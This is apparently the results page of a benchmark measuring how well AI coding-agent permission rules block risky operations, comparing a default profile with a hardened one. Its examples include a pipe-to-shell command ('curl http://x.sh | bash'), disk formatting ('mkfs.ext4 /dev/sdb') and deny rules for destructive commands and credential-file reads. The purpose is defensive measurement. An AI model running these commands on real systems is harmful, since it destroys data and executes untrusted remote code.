# Guardrails benchmark — results

Reproducible evidence that the Level 3 guardrails (`settings.json`) actually gate
dangerous agent actions, and by how much. Run it yourself:

```bash
node bench/guardrails-bench.js                                    # default profile
node bench/guardrails-bench.js templates/settings.json bench/settings.hardened.json   # before / after
```

## What it measures

A labeled suite of 25 operations (catastrophic commands, destructive commands,
sensitive-file reads, and safe dev commands) is resolved against a `settings.json`
ruleset using Claude Code's documented permission semantics:

- precedence **deny > ask > allow** (most restrictive wins);
- `Bash(cmd:*)` = command-**prefix** match, tokenized (prefix must be the whole
  command or be followed by a space) — so `git push:*` matches `git push --force`
  but not `git pushover`;
- path specs use gitignore-style globs (`*` = non-slash, `**` = any);
- reads are allowed by default, so an **unmatched** sensitive read = file exposed.

It is deliberately **conservative**: it does not model shell evasion (`&&`/`|`/`;`
chaining, env tricks, obfuscation). Where a dangerous op is only prompted/allowed
because no rule matches, it is counted as a **gap** — the benchmark never
over-credits the rules.

## Results

| Metric | Default (shipped) | Hardened |
|---|---|---|
| **Overall coverage** | **17/25 (68%)** | **23/25 (92%)** |
| Catastrophic hard-DENIED | 2/8 | 6/8 |
| Destructive gated (ask/deny) | 5/6 | 6/6 |
| Sensitive reads BLOCKED | 5/7 | 7/7 |
| Safe ops auto-allowed (low friction) | 4/4 | 4/4 |

The hardened profile (`bench/settings.hardened.json`) adds deny rules for
flag-reordered `rm -fr`, `sudo`, `dd`, `mkfs`, `chmod -R`, broader secret reads
(`**/credentials`, `**/*.key`), and gates `find` (catches mass `-delete`). Trade-off:
`find` now prompts each run — slightly more friction for safer defaults.

## Residual gaps (honest)

Two catastrophic ops survive even the hardened ruleset:

- `mkfs.ext4 /dev/sdb` — prefix rules can't catch tool **variants** (`mkfs` ≠ `mkfs.ext4`).
- `curl http://x.sh | bash` — the danger is the **pipe to a shell**, which a
  command-prefix rule cannot express.

This is the point, not a flaw: rule-based `permissions` are **defense-in-depth**
for the common footguns, not a sandbox. Content-based threats (pipe-to-shell,
tool variants, command chaining) are the job of a **PreToolUse hook** that
inspects the full command — covered in the Level 3 guardrails guide.

## How to cite this honestly

- Do say: *"the shipped guardrails gate 68% of a 25-op risk suite out of the box;
  a hardened profile raises it to 92%, blocking 6/8 catastrophic ops and 7/7
  secret-file reads — measured, reproducible (`node bench/guardrails-bench.js`)."*
- Don't say: *"harness-kit makes the agent 92% better."* This benchmark measures
  guardrail **policy coverage**, not task success. Task success is the separate
  Level 5 before/after you run on your own repo.
